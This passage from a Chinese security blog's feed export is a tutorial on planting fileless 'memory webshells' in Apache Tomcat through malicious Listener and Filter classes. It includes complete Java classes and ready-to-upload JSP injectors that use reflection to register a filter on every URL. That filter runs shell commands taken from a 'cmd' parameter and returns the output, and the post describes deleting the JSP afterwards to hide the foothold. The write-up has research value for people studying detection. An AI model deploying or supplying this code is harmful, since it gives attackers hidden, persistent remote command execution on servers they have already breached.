title="后记"></a>后记</h2><p>第一次搞底层的玩意儿，导致调试这东西花了我不少时间。。<br>不过学的还是？蛮多的？<br>动态调试，c++，汇编，PE结构，动态寻址都学到了些。（怎么感觉在往逆向走了2333<br>继续弄吧，这个项目目前还有bug，等以后来了兴趣再继续添加更多更牛逼的机制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考:&lt;a href=&quot;https://blog.csdn.net/qq_31507523/article/details/89438410&quot;&gt;https://blog.csdn.net/qq_31507523/article/details/89438410&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    
    <category term="系统相关与免杀" scheme="http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>tomcat Listener，Filter内存马简要分析</title>
    <link href="http://const27.com/2021/06/28/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"/>
    <id>http://const27.com/2021/06/28/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/</id>
    <published>2021-06-28T13:51:11.051Z</published>
    <updated>2021-06-27T04:44:52.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tomcat内存马"><a href="#tomcat内存马" class="headerlink" title="tomcat内存马"></a>tomcat内存马</h1><h2 id="tomcat-容器"><a href="#tomcat-容器" class="headerlink" title="tomcat 容器"></a>tomcat 容器</h2><p>tomcat 主要包含四种容器：Engine，Host，Context，Wrapper。其对应关系如下图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210406203203615.png" alt="image-20210406203203615"></p><p>详细解读一下这个图。</p><p>一台服务器上是可以配置多个站点的，对于tomcat来说，每一个站点就对应一个HOST。</p><p>一个站点上是可以配置多个WEB应用的，比如说一个站点可能会有OA，SSO，邮件应用等等WEB应用，对于tomcat来说每一个WEB应用便对应着一个Context。</p><p>一个WEB应用中肯定也有多个访问路径，比如说OA可能就有登录，前端展示，搜索等。所以对于每一个访问路径tomcat都会分配一个Wrapper，每一个Wrapper对应一个Servlet，用于处理特定请求。</p><h2 id="Listener-内存马"><a href="#Listener-内存马" class="headerlink" title="Listener 内存马"></a>Listener 内存马</h2><p>tomcat收到请求时，处理顺序是 Listener-&gt;Filter-&gt;Servlet。<br>也就是说Listener是最先接触到数据请求的，我们可以在Listener上做手脚从而达到内存马的目的。</p><p>实际上，我们想实现一个内存马，思路便是想让tomcat执行一段恶意程序，把恶意的listener或者filter类写入tomcat内存中，由于tomcat处理请求时，请求会被listener和filter处理（也就是说会被我们的恶意类处理），因此达到隐蔽的木马功能。</p><p>具体怎么个实现呢？我们可以大致想象一个思路：获取服务器初步权限后，创建一个JSP并向内写入向内存注入恶意Listener或filter的代码，随后访问JSP触发JSP代码，恶意Listener或filter被注入内存，随后删除JSP，通过恶意Listener或filter实现无文件webshell。但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错，具体解决方法就是下文的内容了：</p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>如果我们想添加一个Listener，那么势必会用到一个方法：addListener。</p><p>我们来分析以下这个方法，想办法通过addListener方法把恶意Listener注入内存。<br>首先addListener方法是这么用的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();</span><br><span class="line">servletContext.addListener(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>我们直接跟进addListener，会发现跟进到了ServletContext这个接口类。</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20210626150246949.png" alt="image-20210626150246949"></p><p>那么实现addListener的类是什么呢？换句话说，servletContext这个实例化对象是如何被实例化的呢？</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626150652699.png" alt="image-20210626150652699"></p><p>通过调试，我们发现servletContext这个对象实际上是一个ApplicationContextFacade对象。<br>我们跟进到ApplicationContextFacade.class中，查看addListener方法的实现。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626151054515.png" alt="image-20210626151054515"></p><p>发现实际上是调用了ApplicationContext类的addListener方法。再次跟进。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626153212402.png" alt="image-20210626153212402"></p><p>这里还调用了一个addListener，再次跟进。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154012832.png" alt="image-20210626154012832"></p><p>这里借用的别人的图，可以发现如果服务器已启动，那么通过直接调用addListener是无法添加监听器的。</p><p>究其原因，便是此处的context是StandardContext，它的状态是开始状态，无法在if判断中返回true。<br>这也就是上文提到的  “但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错”</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154229868.png" alt="image-20210626154229868"></p><p>如果能够突破if判断，来到此处，那么监听器就会被顺利的添加上</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626155428011.png" alt="image-20210626155428011"></p><h3 id="编写Listener内存马"><a href="#编写Listener内存马" class="headerlink" title="编写Listener内存马"></a>编写Listener内存马</h3><p>既然阻碍我们添加Listener的原因已经找到了，那么就应该考虑如何绕过这个限制了。<br>很简单，通过反射即可绕过这个限制。</p><p>在编写反射代码之前，我们有必要去看一下，我们怎样才能通过反射”够到”StandardContext的addApplicationEventListener方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626160137366.png" alt="image-20210626160137366"></p><p>可以直观的看到，我们可以通过servletContext获得它的context属性（ApplicationContext对象），然后通过ApplicationContext对象的context获得StandardContext对象，然后调用addApplicationEventListener方法。很好。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反射代码</span><br><span class="line">            ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();</span><br><span class="line">            Field field &#x3D; servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(servletContext);</span><br><span class="line">            field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">            standardContext.addApplicationEventListener(new MyListener(request,response)); &#x2F;&#x2F;这一行是将某个Listener类添加到监听器</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">恶意Listener</span><br><span class="line">public class MyListenr implements ServletRequestListener &#123;</span><br><span class="line"></span><br><span class="line">    public ServletResponse response;</span><br><span class="line">    public ServletRequest request;</span><br><span class="line"></span><br><span class="line">    MyListenr(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">        this.request &#x3D; request;</span><br><span class="line">        this.response &#x3D; response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        String cmder &#x3D; request.getParameter(&quot;cmd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process ps &#x3D; Runtime.getRuntime().exec(cmder);</span><br><span class="line">            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">            StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            String result &#x3D; sb.toString();</span><br><span class="line">            this.response.getWriter().write(result);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.out.println(&quot;error &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验一下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162713503.png" alt="image-20210626162713503"></p><p>我们先访问/a路由，让代码被执行。然后到任意页面传入恶意参数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162750746.png" alt="image-20210626162750746"></p><p>SUCCESS。</p><p>为了更方便的注入内存马，我从网上嫖了一个JSP（Linux版）。只要我们上传该JSP然后访问它一下，内存马就被注入了，十分的方便。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.jasper.tagplugins.jstl.core.Out&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;javax.servlet.annotation.WebServlet&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">     Object obj &#x3D; request.getServletContext();</span><br><span class="line">     Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">     field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">     ListenH listenH &#x3D; new ListenH(request, response);</span><br><span class="line">    standardContext.addApplicationEventListener(listenH);</span><br><span class="line">    out.print(&quot;test&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    public class ListenH implements ServletRequestListener &#123;</span><br><span class="line">        public ServletResponse response;</span><br><span class="line">        public ServletRequest request;</span><br><span class="line"></span><br><span class="line">        ListenH(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">            this.request &#x3D; request;</span><br><span class="line">            this.response &#x3D; response;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">            String cmder &#x3D; request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;;</span><br><span class="line">            try &#123;</span><br><span class="line">                Process ps &#x3D; Runtime.getRuntime().exec(cmd);</span><br><span class="line">                BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">                StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">                String line;</span><br><span class="line">                while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                    &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                    sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                String result &#x3D; sb.toString();</span><br><span class="line">                this.response.getWriter().write(result);</span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                System.out.println(&quot;error &quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="Filter-内存马"><a href="#Filter-内存马" class="headerlink" title="Filter 内存马"></a>Filter 内存马</h2><p>Filter内存马与Listener内存马还是有点区别的，要复杂一点点</p><h3 id="doFilter方法如何被执行？"><a href="#doFilter方法如何被执行？" class="headerlink" title="doFilter方法如何被执行？"></a>doFilter方法如何被执行？</h3><h4 id="配置filter"><a href="#配置filter" class="headerlink" title="配置filter"></a>配置filter</h4><p>再开始分析Filter内存马时，我们需要先知道，Filter类中的doFilter方法是如何被执行的。</p><p>OK我们先创建好一个Filter。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Filter类代码</span><br><span class="line">public class MyFilter implements ServletRequestListener &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Filter!&quot;);</span><br><span class="line">        chain.doFilter(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">    public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来在web.xml中添加Filter。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626193215688.png" alt="image-20210626193215688"></p><p>我们在doFilter方法处下断点，运行，得到调用帧如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204005990.png" alt="image-20210626204005990"></p><h4 id="filterchain"><a href="#filterchain" class="headerlink" title="filterchain"></a>filterchain</h4><p>我们从StandardWrapperValue#invoke 处开始分析.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure><p>那么这个filterChain是什么？我们跟进一下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204524626.png" alt="image-20210626204524626"></p><p>再度跟进到createFilterChain方法，来到了ApplicationFilterFactory.java里。</p><p>比较关键的代码是这里。这个方法会遍历FilterMaps，检测每个FilterMap项对应的那个Filter与请求的路由等是否一致。若一致则将以该filter的name为参数去FilterConfigs里去寻找对应的FilterConfig,然后将该filterconfig放入filterchain中。不一致的则抛弃。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204752458.png" alt="image-20210626204752458"></p><h4 id="filterconfig与filterdef"><a href="#filterconfig与filterdef" class="headerlink" title="filterconfig与filterdef"></a>filterconfig与filterdef</h4><p>那么filterconfig又是个什么样的东西呢？</p><p>我们跟进context.findFilterConfig,这里的context是StandardContext。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205344727.png" alt="image-20210626205344727"></p><p>再度跟进filterconfigs，就可以很明显的发现filterconfigs是一个hashmap结构 键为filter名，值为filterconfig<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205418654.png" alt="image-20210626205418654"></p><p>那么filterconfig的结构又是如何。我们跟进ApplicationFilterConfig类。下图是此类的构造函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205854332.png" alt="image-20210626205854332"></p><p>关键地方圈出来了是与filterdef有关的代码。在构造函数的时候将传入context和filterdef，然后再通过对filterdef调用getfilter获得filter类（即我们自己定义的filter类）。<br> 我们再看看filterDef的关键代码</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210144048.png" alt="image-20210626210144048"><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210116555.png" alt="image-20210626210116555"></p><p>OKOK，上面就是FilterConfig，FilterChain和FilterDef的一些零碎的介绍。<br>我们大致可以得到下列关键信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FilterConfigs 是一个HashMap结构，键为filter名，值为filterconfig</span><br><span class="line">filterconfig包含了filterdef</span><br><span class="line">filterdef直接与filter类相关联</span><br></pre></td></tr></table></figure><p>StandardWrapperValue#invoke 这一层分析完了，这一层是最麻烦的，向下两层将会亲切很多。</p><h4 id="下面的两层"><a href="#下面的两层" class="headerlink" title="下面的两层"></a>下面的两层</h4><p>向下分析来到ApplicationFilterChain#doFilter.这一层很简单，调了个internalDofilter就没了<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210643466.png" alt="image-20210626210643466"></p><p>再向下分析来到ApplicationFilterChain#internalDoFilter。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210808889.png" alt="image-20210626210808889"></p><p>关键的地方圈出来了，大致就是通过filterchain里的filterconfig的getFilter方法（下图为getFilter方法，可以明显看到是返回了filter）从而获得filterdef里的filter，从而调用filter的dofilter，这就是大概的流程。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627113023603.png" alt="image-20210627113023603"></p><h4 id="加载过程流程图"><a href="#加载过程流程图" class="headerlink" title="加载过程流程图"></a>加载过程流程图</h4><p>文字总是有些贫瘠的，用图来说话就会明了许多。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627115155496.png" alt="image-20210627115155496"></p><h3 id="FilterDef添加"><a href="#FilterDef添加" class="headerlink" title="FilterDef添加"></a>FilterDef添加</h3><p>我们如何把FilterDef与我们的Filter关联起来并添加到standardContext中呢？这个问题比较关键，因为我们必须将我们的FilterDef注入到内存才能让我们的Filter有被调用的可能性。</p><p>实际上呢，也很简单。流程上来说与Listener内存马差不多</p><p>打断点</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122501784.png" alt="image-20210627122501784"></p><p>跟进<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122632548.png" alt="image-20210627122632548"></p><p>再跟</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122645331.png" alt="image-20210627122645331"></p><p>继续跟</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122745165.png" alt="image-20210627122745165"></p><p>来到此处，与Listener内存马神似。<br>if判断里判断了程序是否在运行<br>context是standardContext，这里调用了它的addFilterDef来添加FilterDef。</p><h3 id="编写Filter内存马"><a href="#编写Filter内存马" class="headerlink" title="编写Filter内存马"></a>编写Filter内存马</h3><p>既然流程已经明白了，那写起来就不难了.<br>至于为什么要用反射，原因和Listener是一样的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反射代码</span><br><span class="line">try &#123;</span><br><span class="line">            response.getWriter().write(&quot;a&quot;);</span><br><span class="line">            System.out.println(&quot;Servlet Get Message\n&quot;);</span><br><span class="line">            Object obj &#x3D; request.getServletContext();</span><br><span class="line">            Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">            field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line">            &#x2F;&#x2F;获取standardContext</span><br><span class="line"></span><br><span class="line">            FilterDef filterDef &#x3D; new FilterDef();</span><br><span class="line">            filterDef.setFilter(new MyFilter());</span><br><span class="line">            filterDef.setFilterName(&quot;MyFilter&quot;);</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line">            &#x2F;&#x2F;将FilterDef与filter关联，注入到内存</span><br><span class="line"></span><br><span class="line">            field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            HashMap filterConfigs &#x3D; (HashMap) field.get(standardContext);&#x2F;&#x2F;获取filterConfigs</span><br><span class="line">            Constructor constructor &#x3D;</span><br><span class="line">                    Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).</span><br><span class="line">                            getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            filterConfigs.put(&quot;MyFilter&quot;,constructor.newInstance(standardContext,filterDef));</span><br><span class="line">            &#x2F;&#x2F;将包含filterDef的filterConfig添加到filterConfigs</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap &#x3D; new FilterMap();</span><br><span class="line">            filterMap.addURLPattern(&quot;&#x2F;*&quot;);</span><br><span class="line">            filterMap.setFilterName(&quot;MyFilter&quot;);</span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">            &#x2F;&#x2F;将该filterMap与filterConfig进行NAME绑定并放到filterMaps的首位</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (IOException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InstantiationException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">木马本体</span><br><span class="line">public class MyFilter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">        String cmder &#x3D; req.getParameter(&quot;cmd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process ps &#x3D; Runtime.getRuntime().exec(cmder);</span><br><span class="line">            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">            StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            String result &#x3D; sb.toString();</span><br><span class="line">            resp.getWriter().write(result);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.out.println(&quot;error &quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">    public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网上嫖的JSP</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.util.HashMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">     Object obj &#x3D; request.getServletContext();</span><br><span class="line">     Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">     field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line"></span><br><span class="line">     FilterDef filterDef &#x3D; new FilterDef();</span><br><span class="line">     filterDef.setFilterName(&quot;testF&quot;);</span><br><span class="line">     standardContext.addFilterDef(filterDef);  &#x2F;&#x2F; 在context中添加filterMap时会去找一下是否存在对应的filterdef</span><br><span class="line">     Filter filter &#x3D; new testF();</span><br><span class="line">     filterDef.setFilter(filter); &#x2F;&#x2F; 将我们创建的filter与filterdef相关联起来</span><br><span class="line"></span><br><span class="line">     field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     HashMap hashMap &#x3D;  (HashMap) field.get(standardContext);</span><br><span class="line">     Constructor constructor &#x3D; Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">     constructor.setAccessible(true);</span><br><span class="line">     hashMap.put(&quot;testF&quot;,constructor.newInstance(standardContext,filterDef));</span><br><span class="line"></span><br><span class="line">     FilterMap filterMap &#x3D; new FilterMap();</span><br><span class="line">     filterMap.addURLPattern(&quot;&#x2F;*&quot;);</span><br><span class="line">     filterMap.setFilterName(&quot;testF&quot;);</span><br><span class="line">     standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">     System.out.println(&quot;filter ok !&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">     public class testF implements Filter &#123;</span><br><span class="line">          public void destroy() &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">               String cmder &#x3D; req.getParameter(&quot;cmd&quot;);</span><br><span class="line">               String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;;</span><br><span class="line">               try &#123;</span><br><span class="line">                    Process ps &#x3D; Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">                    StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                         &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                         sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    String result &#x3D; sb.toString();</span><br><span class="line">                    resp.getWriter().write(result);</span><br><span class="line">               &#125;catch (Exception e)&#123;</span><br><span class="line">                    System.out.println(&quot;error &quot;);</span><br><span class="line">               &#125;</span><br><span class="line">               chain.doFilter(req,resp);</span><br><span class="line">          &#125;</span><br><span class="line">          public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122022432.png" alt="image-20210627122022432"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>个人感觉这篇文章写的比较乱，特别是Filter内存马。<br>这也是我拖了3个月才来搞的东西，这学期事有点多，很多之前想搞的东西都没腾出时间弄。<br>这篇文章讲到的内存马实际上并没有实现完全的无文件落地，中间会有恶意JSP文件落地。更高级的攻击形式后面再搞吧。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/">http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext">https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext</a></p><p><a href="https://blog.csdn.net/angry_program/article/details/116661899">https://blog.csdn.net/angry_program/article/details/116661899</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tomcat内存马&quot;&gt;&lt;a href=&quot;#tomcat内存马&quot; class=&quot;headerlink&quot; title=&quot;tomcat内存马&quot;&gt;&lt;/a&gt;tomcat内存马&lt;/h1&gt;&lt;h2 id=&quot;tomcat-容器&quot;&gt;&lt;a href=&quot;#tomcat-容器&quot; class</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>shiro反序列化(shiro-550与shiro-721)</title>
    <link href="http://const27.com/2021/06/28/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro-550%E4%B8%8Eshiro-721)/"/>
    <id>http://const27.com/2021/06/28/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro-550%E4%B8%8Eshiro-721)/</id>
    <published>2021-06-28T13:51:11.047Z</published>
    <updated>2021-03-13T07:19:29.768Z</updated>
    
